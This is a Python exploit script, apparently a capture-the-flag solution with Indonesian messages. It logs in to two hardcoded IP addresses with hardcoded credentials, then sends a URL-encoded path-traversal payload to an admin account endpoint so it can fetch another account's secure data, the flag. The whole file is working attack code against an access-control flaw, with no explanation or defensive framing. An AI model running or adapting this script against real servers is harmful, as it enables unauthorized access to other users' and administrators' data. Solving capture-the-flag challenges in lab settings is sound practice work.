#!/usr/bin/env python3
import sys
import requests


TARGETS = [
    "http://155.212.132.248",
    "http://83.222.27.64",
]
USERNAME = "angel"
PASSWORD = "princess"
ADMIN_ID = "239716013"
TRAVERSAL_PAYLOAD = "679202372644%2f..%2f239716013"


def login(session: requests.Session, base_url: str) -> dict:
    response = session.post(
        f"{base_url}/login",
        json={"username": USERNAME, "password": PASSWORD},
        timeout=10,
    )
    response.raise_for_status()
    data = response.json()
    if "token" not in data:
        raise RuntimeError("Login berhasil tapi token tidak ditemukan")
    return data


def fetch_flag(session: requests.Session, base_url: str, token: str) -> str:
    response = session.post(
        f"{base_url}/admin/account/{TRAVERSAL_PAYLOAD}",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        },
        json={"action": "fetch_secure_data"},
        timeout=10,
    )
    response.raise_for_status()
    data = response.json()
    flag = data.get("data", "")
    if not flag:
        raise RuntimeError(f"Respons tidak memuat data flag: {data}")
    return flag


def main() -> int:
    for base_url in TARGETS:
        try:
            session = requests.Session()
            login_data = login(session, base_url)
            token = login_data["token"]
            flag = fetch_flag(session, base_url, token)
            print(f"[+] Target   : {base_url}")
            print(f"[+] User ID  : {login_data.get('user_id')}")
            print(f"[+] Admin ID : {ADMIN_ID}")
            print(f"[+] Flag     : {flag}")
            return 0
        except Exception as exc:
            print(f"[-] Gagal di {base_url}: {exc}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
